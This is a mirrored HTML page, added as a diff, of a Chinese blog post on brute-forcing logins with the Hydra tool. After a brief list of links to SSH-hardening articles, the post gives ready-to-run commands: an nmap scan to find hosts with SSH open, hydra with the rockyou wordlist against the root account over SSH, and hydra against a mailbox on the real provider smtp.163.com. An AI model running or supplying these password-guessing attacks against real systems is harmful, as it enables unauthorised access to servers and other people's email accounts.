@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+  
+<!-- Mirrored from topspeedsnail.com/kydra-crack-ssh-and-avoid-attack/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 04:21:56 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>使用Hydra通过ssh破解密码</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="Hydra是非常高效的网络登录破解工具，它可以对多种服务程序执行暴力破解（SSH、VNC等等）。
+
+" />
+    <meta property="og:description" content="Hydra是非常高效的网络登录破解工具，它可以对多种服务程序执行暴力破解（SSH、VNC等等）。
+
+" />
+    
+    <meta name="author" content="Elephant And Balloon" />
+
+    
+    <meta property="og:title" content="使用Hydra通过ssh破解密码" />
+    <meta property="twitter:title" content="使用Hydra通过ssh破解密码" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="../style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Elephant And Balloon - 关于黑技术的小博客" href="../feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="../index.html" class="site-avatar"><img src="https://avatars1.githubusercontent.com/u/5637917?v=3&amp;s=140" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="../index.html">Elephant And Balloon</a></h1>
+            <p class="site-description">关于黑技术的小博客</p>
+          </div>
+
+          <nav>
+            <a href="../index.html">主页</a>
+            <a href="../about/index.html">关于我</a>
+          </nav>
+
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>使用Hydra通过ssh破解密码</h1>
+
+  <div class="entry">
+    <p>Hydra是非常高效的网络登录破解工具，它可以对多种服务程序执行<a href="../hack-brute-force/index.html">暴力破解</a>（SSH、VNC等等）。</p>
+
+<p>防止这种攻击其实很容易，方法很多。以SSH为例：</p>
+
+<ul>
+  <li><a href="http://blog.topspeedsnail.com/archives/3936">Ubuntu：使用Port Knocking隐藏SSH端口</a></li>
+  <li><a href="http://blog.topspeedsnail.com/archives/262">在Ubuntu中用Fail2Ban保护SSH</a></li>
+  <li><a href="http://blog.topspeedsnail.com/archives/3119">CentOS 7安装使用Fail2Ban保护SSH</a></li>
+  <li><a href="http://blog.topspeedsnail.com/archives/3667">Debian使用Fail2Ban和Tinyhoneypot增加网络安全</a></li>
+</ul>
+
+<hr />
+
+<p>Kail Linux有一个的GUI版本：xhydra，也有一个命令行版本：hydra。</p>
+
+<p>xhydra：</p>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-16%2010-26-48.png" alt="xhydra" /></p>
+
+<p>hydra：</p>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-16%2010-28-41.png" alt="hydra" /></p>
+
+<p>我使用命令行版本：hydra</p>
+
+<h3 id="字典">字典</h3>
+
+<p>这种攻击需要字典文件，一个好的字典至关重要。我以Kali Linux自带的rockyou字典为例，位于/user/share/wordlists/rockyou.txt.gz。</p>
+
+<p>使用前先解压：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># gzip -d /usr/share/wordlists/rockyou.txt.gz</span></code></pre></figure>
+
+<h3 id="使用nmap扫描开启ssh服务的主机">使用nmap扫描开启SSH服务的主机</h3>
+
+<p>扫描SSH服务(22端口)，确定可以施行破解的主机。</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">＃ nmap -p 22 -open -sV one_IP_or_range_or_subnet &gt; MyTarget</code></pre></figure>
+
+<h3 id="使用hydra暴力破解">使用hydra暴力破解</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 ssh</span></code></pre></figure>
+
+<hr />
+
+<p>破解邮箱密码：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code># hydra -S -l test@163.com -P /usr/share/wordlists/rockyou.txt -e ns -V -s 465 -t 1 smtp.163.com smtp
+</code></pre>
+</div>
+
+<p>更多选项，查看man hydra。</p>
+
+  </div>
+
+  <div class="date">
+    Written on April 16, 2016
+  </div>
+
+  
+<div class="comments">
+	<div id="disqus_thread"></div>
+	<script type="text/javascript">
+
+	    var disqus_shortname = 'elephantandballoon';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+
+	</script>
+	<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/tiancode"><i class="svg-icon github"></i></a>
+
+
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','http://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-75657205-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/kydra-crack-ssh-and-avoid-attack/',
+		  'title': '使用Hydra通过ssh破解密码'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+<!-- Mirrored from topspeedsnail.com/kydra-crack-ssh-and-avoid-attack/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 04:22:04 GMT -->
+</html>
